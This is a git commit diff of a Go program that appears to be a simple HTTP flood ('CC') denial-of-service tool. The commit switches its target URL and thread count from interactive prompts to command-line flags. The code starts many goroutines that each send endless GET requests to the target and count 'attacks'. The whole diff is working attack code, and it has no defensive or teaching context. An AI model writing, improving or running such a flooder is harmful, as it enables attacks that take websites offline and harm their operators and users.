f26a715293c2cfdf818bef8d9324a6b02427fb75
BoyChai <1972567225@qq.com>
2022-04-30 23:54:39 +0800

    v1.01 -Command parameters

--- main.go
+++ main.go
@@ -1,6 +1,7 @@
 package main
 
 import (
+	"flag"
 	"fmt"
 	"net/http"
 	"sync"
@@ -12,23 +13,29 @@ func cc(url string, num int) {
 	num2 := 0
 	for true {
 		num2++
-		//request, _ := http.Get(url)
 		http.Get(url)
 		fmt.Printf("The current thread is %d and the number of attacks is %d\n", num, num2)
-		//fmt.Println("Status of this request:", request.StatusCode)
 	}
 	wg.Done()
 }
+
+//url
+var u = flag.String("u", "", "url: url address")
+
+//攻击线程
+var c = flag.Int("c", 0, "concurrent: concurrent number")
+
+//主线程
 func main() {
-	url := ""
-	var s int
-	//获取攻击地址
-	fmt.Print("URL address: ")
-	fmt.Scanln(&url)
-	//获取攻击线程
-	fmt.Print("Concurrent number: ")
-	fmt.Scanln(&s)
-	for i := 1; i <= s; i++ {
+
+	//解析命令行参数
+	flag.Parse()
+
+	//传值
+	url := *u
+	concurrent := *c
+
+	for i := 1; i <= concurrent; i++ {
 		wg.Add(1)
 		fmt.Println("Thread created: ", i)
 		go cc(url, i)
